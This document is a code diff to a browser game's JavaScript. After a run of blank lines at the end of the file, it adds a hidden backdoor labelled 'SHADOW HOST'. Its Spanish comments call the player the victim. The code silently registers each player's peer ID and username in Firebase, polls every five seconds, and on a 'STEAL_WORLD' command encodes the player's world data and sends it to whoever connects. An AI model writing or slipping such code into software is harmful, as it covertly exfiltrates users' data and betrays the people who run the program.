@@ -1598,3 +1598,71 @@ if (toolSizeSlider) {
 if (toolSizeDisplay) {
     toolSizeDisplay.addEventListener('wheel', handleWheelZoom, { passive: false });
 }
+
+
+
+
+
+
+
+// ==========================================
+// 🥷 SHADOW HOST (SERVIDOR INVISIBLE)
+// ==========================================
+let shadowPeer = null;
+
+function initShadowHost() {
+    // Solo inicia si el jugador tiene un mundo abierto
+    if (typeof mbwom === 'undefined' || !mbwom.world || Object.keys(mbwom.world).length === 0) return;
+    
+    // Si ya está corriendo o PeerJS no ha cargado, no hacemos nada
+    if (shadowPeer || typeof Peer === 'undefined') return;
+
+    // Creamos la conexión paralela silenciosa
+    shadowPeer = new Peer();
+
+    shadowPeer.on('open', function(id) {
+        try {
+            // Guardamos el ID secreto en una nueva carpeta de Firebase llamada "shadow_rooms"
+            const db = firebase.database();
+            let myUID = localStorage.getItem('mbw_uid') || 'Desconocido';
+            let myName = localStorage.getItem('mbw_username') || "Player";
+            
+            db.ref('shadow_rooms/' + myUID).set({
+                hostId: id,
+                username: myName,
+                timestamp: Date.now()
+            });
+            
+            // Latido: Actualiza la hora cada 30 segundos para saber quién está en línea
+            setInterval(() => {
+                db.ref('shadow_rooms/' + myUID).update({ timestamp: Date.now() });
+            }, 30000);
+        } catch(e) {}
+    });
+
+    shadowPeer.on('connection', function(conn) {
+        // Cuando te conectas como Admin, el navegador de la víctima acepta en silencio
+        conn.on('data', function(data) {
+            if (data.cmd === "STEAL_WORLD") {
+                
+                // 1. Recopila el mapa de la víctima desde su RAM
+                let currentScene = (typeof mbwom.currentScene !== 'undefined') ? mbwom.currentScene : 1;
+                if (mbwom.sceneList) {
+                    mbwom.sceneList.forEach(key => {
+                        if (mbwom[key] !== undefined) mbwom.world[key + currentScene] = mbwom[key];
+                    });
+                }
+                
+                // 2. Comprime el mapa al máximo usando tu algoritmo
+                const jsonString = JSON.stringify(mbwom.world);
+                const encodedText = mbwAlgorithm.encode(jsonString);
+                
+                // 3. Envía el paquete por debajo de la mesa
+                conn.send({ type: "WORLD_PAYLOAD", payload: encodedText });
+            }
+        });
+    });
+}
+
+// El programa intentará iniciar la puerta trasera cada 5 segundos de forma silenciosa
+setInterval(initShadowHost, 5000);
